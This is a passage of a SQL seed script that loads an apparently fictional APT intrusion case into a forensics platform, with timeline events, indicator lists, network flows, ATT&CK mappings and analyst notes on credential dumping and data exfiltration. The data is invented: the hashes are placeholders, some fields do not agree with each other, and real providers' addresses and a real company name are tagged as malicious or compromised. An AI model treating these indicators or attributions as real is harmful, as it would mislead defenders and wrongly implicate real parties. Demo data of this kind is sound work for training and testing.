   '[CRITICAL] DNS Tunneling — Large Volume Queries',
   '⚠ CRITIQUE: Volume DNS anormal détecté — 47 239 requêtes TXT vers *.d3f.xz-exfil.ru en 4h',
   'Hayabusa v2.18', 'LAPTOP-EXEC01', 'SYSTEM', 'svchost32.exe',
   'T1048.003', 'Exfiltration Over DNS', 'exfiltration',
   '{"level": "critical", "QueryCount": 47239, "Domain": "*.d3f.xz-exfil.ru", "Period": "4h"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-10 02:22:18+00', 'evtx',
   'Security.evtx', 'Connexion HTTPS vers 185.220.101.42:443 — upload docs_batch1.7z chiffré (847 MB)',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'svchost32.exe',
   'T1041', 'Exfiltration Over C2 Channel', 'exfiltration',
   '{"EventID": 5156, "DestAddress": "185.220.101.42", "DestPort": 443, "BytesSent": 888782848}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-12 23:15:33+00', 'evtx',
   'Security.evtx', 'Connexion HTTPS vers 45.83.64.77:443 — upload docs_batch2.7z (1.2 GB)',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'svchost32.exe',
   'T1041', 'Exfiltration Over C2 Channel', 'exfiltration',
   '{"EventID": 5156, "DestAddress": "45.83.64.77", "DestPort": 443, "BytesSent": 1290858496}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-14 04:02:10+00', 'hayabusa',
   '[HIGH] Scheduled Exfiltration via BITS',
   '⚠ ÉLEVÉ: Background Intelligent Transfer Service utilisé pour exfiltration planifiée nocturne',
   'Hayabusa v2.18', 'LAPTOP-EXEC01', 'SYSTEM', 'svchost.exe',
   'T1197', 'BITS Jobs', 'exfiltration',
   '{"level": "high", "BITSJobName": "WindowsUpdate", "RemoteURL": "https://cdn.windowsupd4te.net/upload", "FileSize": "2.1 GB"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-15 01:30:44+00', 'evtx',
   'Security.evtx', 'Beaconing régulier C2 — intervalle 300s ±4% (beacon score 96%)',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'svchost32.exe',
   'T1071.001', 'Web Protocols C2', 'command-and-control',
   '{"EventID": 5156, "DestAddress": "162.159.135.233", "DestPort": 443, "Interval": "~300s", "BeaconScore": 96}'),

  -- Beaconing (multiple events to fill out the timeline)
  (v_case_id, v_ev3_id, v_pr_id, '2026-02-16 02:15:11+00', 'evtx',
   'Security.evtx', 'Beacon C2 — POST /api/v2/telemetry HTTP/1.1 (162.159.135.233)',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'svchost32.exe',
   'T1071.001', 'Web Protocols C2', 'command-and-control',
   '{"EventID": 5156, "DestAddress": "162.159.135.233", "DestPort": 443, "BytesSent": 512}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-17 03:22:44+00', 'evtx',
   'Security.evtx', 'Beacon C2 — POST /api/v2/telemetry HTTP/1.1 (162.159.135.233)',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'svchost32.exe',
   'T1071.001', 'Web Protocols C2', 'command-and-control',
   '{"EventID": 5156, "DestAddress": "162.159.135.233", "DestPort": 443, "BytesSent": 512}'),

  -- PHASE 9 — Detection (2026-02-22) ─────────────────────────────────────────
  (v_case_id, v_ev3_id, v_pr_id, '2026-02-22 08:12:34+00', 'hayabusa',
   '[CRITICAL] Mass DNS Exfiltration Pattern Detected',
   '⚠ CRITIQUE: Alerte SIEM — pattern d''exfiltration DNS détecté par la règle Sigma (>10k req/h)',
   'Hayabusa v2.18', 'LAPTOP-EXEC01', 'SYSTEM', 'svchost32.exe',
   'T1048.003', 'Exfiltration Over DNS', 'exfiltration',
   '{"level": "critical", "TotalBytes": 2147483648, "Duration": "18 days", "AnomalyScore": 98.7}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-22 08:45:00+00', 'evtx',
   'Security.evtx', 'Windows Defender — Threat Detected: Trojan:Win64/DAZZLESPY.A (svchost32.exe)',
   'Security.evtx', 'LAPTOP-EXEC01', 'SYSTEM', 'MsMpEng.exe',
   'T1562.001', 'Disable/Modify Tools', 'defense-evasion',
   '{"EventID": 1116, "ThreatName": "Trojan:Win64/DAZZLESPY.A", "Action": "Quarantine", "File": "C:\\ProgramData\\SyncProvider\\svchost32.exe"}'),

  (v_case_id, v_ev3_id, v_pr_id, '2026-02-22 09:02:17+00', 'hayabusa',
   '[CRITICAL] Backdoor Process Terminated by AV',
   '⚠ CRITIQUE: Backdoor svchost32.exe mis en quarantaine — C2 coupé, investigation urgente requise',
   'Hayabusa v2.18', 'LAPTOP-EXEC01', 'SYSTEM', 'MsMpEng.exe',
   'T1562.001', 'Disable/Modify Tools', 'defense-evasion',
   '{"level": "critical", "Action": "Process terminated + Quarantined", "IOC": "C:\\ProgramData\\SyncProvider\\svchost32.exe"}');

  -- ── 5. IOCs ──────────────────────────────────────────────────────────────
  INSERT INTO iocs (case_id, ioc_type, value, description, severity, is_malicious, source, first_seen, last_seen, tags, created_by)
  VALUES
  -- C2 Infrastructure
  (v_case_id, 'ip', '185.220.101.42',
   'Serveur C2 principal — hébergé chez Serverius (NL). Upload exfiltration batch1 (847 MB)',
   10, true, 'Zeek/Network Capture', '2026-02-10 02:22:00+00', '2026-02-10 02:40:00+00',
   ARRAY['c2', 'exfiltration', 'apt29'], v_admin_id),

  (v_case_id, 'ip', '45.83.64.77',
   'Serveur C2 secondaire — hébergé chez M247 (RO). Upload exfiltration batch2 (1.2 GB)',
   10, true, 'Zeek/Network Capture', '2026-02-12 23:15:00+00', '2026-02-12 23:55:00+00',
   ARRAY['c2', 'exfiltration', 'apt29'], v_admin_id),

  (v_case_id, 'ip', '162.159.135.233',
   'CDN Cloudflare abusé pour C2 — domain fronting. Beacon interval ~300s',
   9, true, 'Zeek/Network Capture', '2026-02-04 01:56:00+00', '2026-02-22 08:12:00+00',
   ARRAY['c2', 'beaconing', 'domain-fronting'], v_admin_id),

  (v_case_id, 'ip', '91.198.174.192',
   'IP Wikimedia (domain fronting) — réutilisé par APT29 pour masquer le trafic C2',
   7, true, 'Zeek/Network Capture', '2026-02-04 02:30:00+00', '2026-02-04 02:31:00+00',
   ARRAY['c2', 'domain-fronting'], v_analyst_id),

  (v_case_id, 'domain', 'update.3cx-cdn.net',
   'Domaine C2 — faux CDN 3CX utilisé pour distribution du stager initial (supply chain)',
   10, true, 'DNS Logs + Proxy', '2026-02-04 01:53:00+00', '2026-02-04 01:54:00+00',
   ARRAY['supply-chain', 'c2', '3cx'], v_admin_id),

  (v_case_id, 'domain', 'cdn.windowsupd4te.net',
   'Domaine C2 — typosquatting Microsoft Windows Update. Utilisé pour BITS exfiltration.',
   10, true, 'DNS Logs', '2026-02-14 04:00:00+00', '2026-02-18 03:00:00+00',
   ARRAY['c2', 'typosquatting', 'exfiltration'], v_admin_id),

  (v_case_id, 'domain', 'xz-exfil.ru',
   'Domaine DNS tunneling — sous-domaines wildcard utilisés pour exfiltration encodée base64',
   10, true, 'DNS Logs + Hayabusa', '2026-02-10 02:20:00+00', '2026-02-18 06:00:00+00',
   ARRAY['dns-tunneling', 'exfiltration', 'apt29'], v_admin_id),

  (v_case_id, 'url', 'https://update.3cx-cdn.net/payload',
   'URL de téléchargement du stager PowerShell (4.2 KB, encoded)',
   10, true, 'PowerShell Script Block Logging', '2026-02-04 01:53:21+00', '2026-02-04 01:53:21+00',
   ARRAY['supply-chain', 'stager', 'powershell'], v_admin_id),

  (v_case_id, 'url', 'https://cdn.windowsupd4te.net/upload',
   'Endpoint d''upload exfiltration — BITS jobs nocturnes',
   9, true, 'BITS Jobs', '2026-02-14 04:00:00+00', '2026-02-18 03:00:00+00',
   ARRAY['exfiltration', 'bits', 'c2'], v_analyst_id),

  -- Malware hashes
  (v_case_id, 'hash_sha256', 'd3f4a5b6c7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4',
   'Hash SHA256 — 3CXDesktopApp.exe (version trojanisée, 45.3 MB). Supply chain compromise confirmé.',
   10, true, 'VirusTotal + EDR', '2026-02-04 01:54:00+00', '2026-02-22 08:45:00+00',
   ARRAY['supply-chain', '3cx', 'trojan'], v_admin_id),

  (v_case_id, 'hash_sha256', 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2',
   'Hash SHA256 — d3dcompiler_47.dll (DLL malveillante, side-loading). Contient DAZZLESPY shellcode.',
   10, true, 'VirusTotal + Malware Analysis', '2026-02-04 01:54:15+00', '2026-02-22 08:45:00+00',
   ARRAY['dll-sideloading', 'dazzlespy', 'apt29'], v_admin_id),

  (v_case_id, 'hash_sha256', 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3',
   'Hash SHA256 — svchost32.exe (backdoor DAZZLESPY, 8.2 MB). Détecté par Defender le 22/02.',
   10, true, 'Windows Defender + EDR', '2026-02-04 02:05:00+00', '2026-02-22 08:45:00+00',
   ARRAY['backdoor', 'dazzlespy', 'apt29', 'persistence'], v_admin_id),

  (v_case_id, 'hash_md5', 'c3d4e5f6a7b8c9d0e1f2a3b4',
   'Hash MD5 — procdump64.exe (légitime mais utilisé malicieusement pour dump LSASS)',
   7, false, 'Prefetch Analysis', '2026-02-05 14:02:00+00', '2026-02-05 14:05:00+00',
   ARRAY['lolbas', 'credential-access'], v_analyst_id),

  -- Internal indicators
  (v_case_id, 'ip', '10.0.1.45',
   'LAPTOP-EXEC01 — poste victime (Directeur Technique). Patient zéro de l''intrusion.',
   8, false, 'Interne', '2026-02-04 01:52:00+00', '2026-02-22 09:00:00+00',
   ARRAY['compromised', 'patient-zero'], v_admin_id),

  (v_case_id, 'ip', '10.0.2.10',
   'WIN-FILESERVER01 — Serveur de fichiers (mouvement latéral J+1)',
   7, false, 'Interne', '2026-02-05 14:31:00+00', '2026-02-22 09:00:00+00',
   ARRAY['compromised', 'lateral-movement'], v_admin_id),

  (v_case_id, 'ip', '10.0.0.5',
   'WIN-DC01 — Contrôleur de domaine (compromis via PsExec J+1)',
   9, false, 'Interne', '2026-02-05 15:10:00+00', '2026-02-22 09:00:00+00',
   ARRAY['compromised', 'domain-controller', 'critical'], v_admin_id),

  (v_case_id, 'ip', '10.0.3.5',
   'WIN-BACKUP01 — Serveur de sauvegarde (accédé pour exfiltration de backups)',
   8, false, 'Interne', '2026-02-06 09:14:00+00', '2026-02-22 09:00:00+00',
   ARRAY['compromised', 'data-theft'], v_analyst_id),

  -- Mutex / Registry
  (v_case_id, 'domain', 'thales-corp.local',
   'Domaine AD interne — mentionné dans les requêtes LDAP exfiltrées',
   5, false, 'AD Logs', '2026-02-04 03:14:00+00', '2026-02-05 15:00:00+00',
   ARRAY['internal', 'ad'], v_analyst_id),

  (v_case_id, 'email', 'benoit.rousseau@thales-corp.local',
   'Compte compromis — credentials extraits de lsass.dmp. Compte avec accès DC.',
   9, false, 'Mimikatz Output', '2026-02-05 14:12:00+00', '2026-02-05 14:12:00+00',
   ARRAY['compromised-account', 'credential-access'], v_admin_id),

  (v_case_id, 'email', 'svc_backup@thales-corp.local',
   'Compte de service compromis (mot de passe simple). Utilisé pour PtH et mouvement latéral.',
   10, false, 'Mimikatz + Event Logs', '2026-02-05 14:25:00+00', '2026-02-22 09:00:00+00',
   ARRAY['compromised-account', 'service-account', 'pass-the-hash'], v_admin_id);

  -- ── 6. Network Connections ─────────────────────────────────────────────────
  INSERT INTO network_connections (case_id, src_ip, src_port, dst_ip, dst_port, protocol,
    bytes_sent, bytes_received, packet_count, first_seen, last_seen, is_suspicious, geo_src, geo_dst, notes)
  VALUES
  -- C2 Beacon (supply chain stager download)
  (v_case_id, '10.0.1.45', 54821, '162.159.135.233', 443, 'TCP',
   512000, 4096000, 8800,
   '2026-02-04 01:56:44+00', '2026-02-22 08:12:00+00', true,
   '{"country": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522}',
   '{"country": "US", "city": "San Jose", "lat": 37.3382, "lon": -121.8863}',
   'Beaconing C2 via Cloudflare CDN (domain fronting). Intervalle ~300s. 18 jours de persistance.'),

  -- Exfiltration batch1
  (v_case_id, '10.0.1.45', 61234, '185.220.101.42', 443, 'TCP',
   888782848, 1024000, 112000,
   '2026-02-10 02:22:00+00', '2026-02-10 02:40:00+00', true,
   '{"country": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522}',
   '{"country": "NL", "city": "Dronten", "lat": 52.5233, "lon": 5.7178}',
   'Exfiltration docs_batch1.7z (847 MB). Serverius NL — infrastructure APT29 connue.'),

  -- Exfiltration batch2
  (v_case_id, '10.0.1.45', 59871, '45.83.64.77', 443, 'TCP',
   1290858496, 512000, 142000,
   '2026-02-12 23:15:00+00', '2026-02-12 23:55:00+00', true,
   '{"country": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522}',
   '{"country": "RO", "city": "Bucharest", "lat": 44.4268, "lon": 26.1025}',
   'Exfiltration docs_batch2.7z (1.2 GB). M247 RO — relais APT.'),

  -- DNS Tunneling (exfiltration)
  (v_case_id, '10.0.1.45', 53888, '185.220.101.42', 53, 'UDP',
   471859200, 2048000, 47239,
   '2026-02-10 02:20:00+00', '2026-02-18 06:00:00+00', true,
   '{"country": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522}',
   '{"country": "NL", "city": "Dronten", "lat": 52.5233, "lon": 5.7178}',
   'DNS Tunneling — 47 239 requêtes TXT encodées base64 vers *.xz-exfil.ru. 450 MB exfiltrés.'),

  -- Initial download (supply chain payload)
  (v_case_id, '10.0.1.45', 49823, '91.198.174.192', 443, 'TCP',
   1024, 45056, 64,
   '2026-02-04 01:53:21+00', '2026-02-04 01:53:25+00', false,
   '{"country": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522}',
   '{"country": "NL", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041}',
   'Téléchargement stager PowerShell depuis faux CDN 3CX (4.2 KB)'),

  -- Lateral movement — RDP to fileserver
  (v_case_id, '10.0.1.45', 51234, '10.0.2.10', 3389, 'TCP',
   10485760, 41943040, 22000,
   '2026-02-05 14:31:22+00', '2026-02-05 16:00:00+00', true,
   '{"country": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522}',
   '{"country": "FR", "city": "Paris", "lat": 48.8570, "lon": 2.3530}',
   'RDP lateral movement LAPTOP-EXEC01 → WIN-FILESERVER01 (compte svc_backup volé)'),

  -- Lateral movement — PsExec to DC
  (v_case_id, '10.0.1.45', 55123, '10.0.0.5', 445, 'TCP',
   5242880, 1048576, 8500,
   '2026-02-05 15:10:44+00', '2026-02-05 15:30:00+00', true,
   '{"country": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522}',
   '{"country": "FR", "city": "Paris", "lat": 48.8572, "lon": 2.3532}',
   'PsExec over SMB — LAPTOP-EXEC01 → WIN-DC01 (Contrôleur de domaine compromis)'),

  -- Lateral movement — RDP to backup server
  (v_case_id, '10.0.0.5', 58901, '10.0.3.5', 3389, 'TCP',
   20971520, 104857600, 35000,
   '2026-02-06 09:14:22+00', '2026-02-06 11:00:00+00', true,
   '{"country": "FR", "city": "Paris", "lat": 48.8572, "lon": 2.3532}',
   '{"country": "FR", "city": "Paris", "lat": 48.8574, "lon": 2.3534}',
   'RDP WIN-DC01 → WIN-BACKUP01 (accès aux sauvegardes pour collecte de données)'),

  -- Normal traffic (for context in network map)
  (v_case_id, '10.0.1.45', 52413, '8.8.8.8', 53, 'UDP',
   2048000, 512000, 3200,
   '2026-02-04 08:00:00+00', '2026-02-22 09:00:00+00', false,
   '{"country": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522}',
   '{"country": "US", "city": "Mountain View", "lat": 37.3861, "lon": -122.0839}',
   'Trafic DNS Google — normal'),

  (v_case_id, '10.0.1.45', 53251, '10.0.0.5', 88, 'TCP',
   1048576, 524288, 4400,
   '2026-02-04 08:00:00+00', '2026-02-22 09:00:00+00', false,
   '{"country": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522}',
   '{"country": "FR", "city": "Paris", "lat": 48.8572, "lon": 2.3532}',
   'Trafic Kerberos normal vers DC'),

  -- BITS exfiltration via CDN fronting
  (v_case_id, '10.0.1.45', 60123, '104.18.32.47', 443, 'TCP',
   2248146944, 1024000, 188000,
   '2026-02-14 04:00:00+00', '2026-02-18 03:00:00+00', true,
   '{"country": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522}',
   '{"country": "US", "city": "San Francisco", "lat": 37.7749, "lon": -122.4194}',
   'BITS exfiltration nocturne — cdn.windowsupd4te.net via Cloudflare (2.1 GB sur 4 nuits)');

  -- ── 7. MITRE ATT&CK Techniques ─────────────────────────────────────────────
  INSERT INTO case_mitre_techniques (case_id, technique_id, tactic, technique_name,
    sub_technique_name, confidence, notes, created_by)
  VALUES
  (v_case_id, 'T1195.002', 'initial-access', 'Supply Chain Compromise',
   'Compromise Software Supply Chain', 'high',
   'Mise à jour 3CXDesktopApp trojanisée. DLL malveillante d3dcompiler_47.dll livrée avec la mise à jour légitime. Similaire opération SolarWinds.', v_admin_id),

  (v_case_id, 'T1566.001', 'initial-access', 'Phishing',
   'Spearphishing Attachment', 'high',
   'Email spear-phishing ciblé DT avec pièce jointe malveillante (Contrat_Thales...docx.exe). Macro Office auto-execute.', v_admin_id),

  (v_case_id, 'T1059.001', 'execution', 'Command and Scripting Interpreter',
   'PowerShell', 'high',
   'Stager PowerShell encodé. Script block logging activé mais partiellement effacé. IEX + WebClient utilisé.', v_analyst_id),

  (v_case_id, 'T1547.001', 'persistence', 'Boot or Logon Autostart Execution',
   'Registry Run Keys / Startup Folder', 'high',
   'HKCU\Software\Microsoft\Windows\CurrentVersion\Run → svchost32.exe. 3 mécanismes de persistance redondants.', v_admin_id),

  (v_case_id, 'T1053.005', 'persistence', 'Scheduled Task/Job',
   'Scheduled Task', 'high',
   'Tâche planifiée cachée dans \\Microsoft\\Windows\\SyncCenter. Trigger: AtLogon + AtStartup.', v_admin_id),

  (v_case_id, 'T1003.001', 'credential-access', 'OS Credential Dumping',
   'LSASS Memory', 'confirmed',
   'ProcDump64 + Mimikatz. 8 comptes extraits dont svc_backup et benoit.rousseau (DA). Clés NTLM réutilisées pour PtH.', v_admin_id),

  (v_case_id, 'T1021.001', 'lateral-movement', 'Remote Services',
   'Remote Desktop Protocol', 'confirmed',
   'RDP depuis LAPTOP-EXEC01 vers WIN-FILESERVER01, WIN-DC01, WIN-BACKUP01 avec credentials volés.', v_admin_id),

  (v_case_id, 'T1560.001', 'collection', 'Archive Collected Data',
   'Archive via Utility', 'confirmed',
   '7-Zip AES-256 utilisé pour archiver 3247 fichiers (docs R&D). 2 batches: 847 MB + 1.2 GB.', v_analyst_id),

  (v_case_id, 'T1048.003', 'exfiltration', 'Exfiltration Over Alternative Protocol',
   'Exfiltration Over Unencrypted Non-C2 Protocol', 'confirmed',
   'DNS Tunneling via requêtes TXT encodées base64 vers *.xz-exfil.ru. 47 239 requêtes sur 8 jours. ~450 MB.', v_admin_id),

  (v_case_id, 'T1071.001', 'command-and-control', 'Application Layer Protocol',
   'Web Protocols', 'confirmed',
   'Beacon HTTPS vers 162.159.135.233 (Cloudflare). Domain fronting actif. Intervalle ~300s. 18 jours de persistance.', v_admin_id);

  -- ── 8. Timeline Bookmarks (événements clés annotés) ──────────────────────
  INSERT INTO timeline_bookmarks (case_id, event_timestamp, title, description,
    mitre_technique, mitre_tactic, color, author_id)
  VALUES
  (v_case_id, '2026-02-04 01:53:19+00',
   '★ ZERO DAY — Première exécution malveillante',
   'WINWORD.EXE spawne powershell.exe via macro Office. C''est le moment T0 de la compromission.',
   'T1059.001', 'execution', '#da3633', v_admin_id),

  (v_case_id, '2026-02-04 02:19:05+00',
   '⚠ Tentative d''effacement des traces',
   'Journal Security.evtx effacé par l''attaquant. Indique une connaissance de l''environnement cible.',
   'T1070.001', 'defense-evasion', '#f0883e', v_admin_id),

  (v_case_id, '2026-02-05 14:03:15+00',
   '⚠ LSASS dumpé — tous les comptes compromis',
   'procdump64.exe → lsass.exe. Tous les credentials en mémoire compromis. Escalade critique.',
   'T1003.001', 'credential-access', '#da3633', v_admin_id),

  (v_case_id, '2026-02-05 15:10:44+00',
   '★ Contrôleur de domaine compromis',
   'PsExec sur WIN-DC01. L''attaquant a un contrôle total sur l''infrastructure AD de Thales-Corp.',
   'T1021.002', 'lateral-movement', '#da3633', v_admin_id),

  (v_case_id, '2026-02-08 02:14:33+00',
   '📦 Staging — Début de l''exfiltration des documents R&D',
   '3 247 fichiers archivés (docs_batch1.7z, 847 MB). Documents classifiés confirmés dans l''archive.',
   'T1560.001', 'collection', '#c89d1d', v_analyst_id),

  (v_case_id, '2026-02-10 02:20:00+00',
   '🔴 EXFILTRATION CONFIRMÉE — Données hors du réseau',
   'DNS Tunneling + HTTPS upload. ~2.5 GB de documents R&D exfiltrés vers infrastructure APT29.',
   'T1048.003', 'exfiltration', '#da3633', v_admin_id),

  (v_case_id, '2026-02-22 08:12:34+00',
   '✓ Point de détection — Alerte SIEM SOC',
   'Alerte SOC sur anomalie DNS. 18 jours après T0. Backdoor toujours actif au moment de la détection.',
   'T1048.003', 'exfiltration', '#22c55e', v_analyst_id);

  -- ── 9. Contexte investigateur AI ─────────────────────────────────────────
  INSERT INTO ai_investigator_context (case_id, free_text, updated_by)
  VALUES (
    v_case_id,
    '## Analyse en cours — DARK OLYMPUS' || chr(10) || chr(10) ||
    '### Hypotheses de travail' || chr(10) ||
    '1. Attribution APT29 probable : TTPs coherents (domain fronting Cloudflare, DAZZLESPY, 3CX supply chain)' || chr(10) ||
    '2. Objectif R&D : selection precise des documents (schemas capteurs IR, specs embarques)' || chr(10) ||
    '3. Acces prealable suspect : attaquant connaissait la topologie reseau' || chr(10) || chr(10) ||
    '### Points a approfondir' || chr(10) ||
    '- [ ] Analyser WIN-DC01 et WIN-BACKUP01 (imagerie urgente)' || chr(10) ||
    '- [ ] Inventaire complet des documents exfiltrés (logs backup)' || chr(10) ||
    '- [ ] Verifier si d''autres postes ont recu la mise a jour 3CX trojanisee' || chr(10) ||
    '- [ ] Contacter ANSSI pour partage IOCs (TLP:AMBER)' || chr(10) || chr(10) ||
    '### Notes techniques' || chr(10) ||
    '- docs_batch1.7z contenait les projets ATHENA et CAPTEUR_IR (voir LNK)' || chr(10) ||
    '- svc_backup avait acces en ecriture aux partages reseau (vecteur propagation)' || chr(10) ||
    '- WMI subscription toujours presente sur WIN-DC01 a verifier',
    v_admin_id
  );

  -- ── 10. Playbook Ransomware/APT associé ──────────────────────────────────
  INSERT INTO case_playbooks (case_id, playbook_id, started_by, started_at)
  SELECT v_case_id, id, v_admin_id, '2026-02-22 09:30:00+00'
  FROM playbooks
  WHERE incident_type = 'apt' OR title ILIKE '%APT%' OR title ILIKE '%Intrusion%'
  LIMIT 1;

  RAISE NOTICE 'Case CASE-2026-DEMO créé avec succès. case_id = %', v_case_id;

END $$;
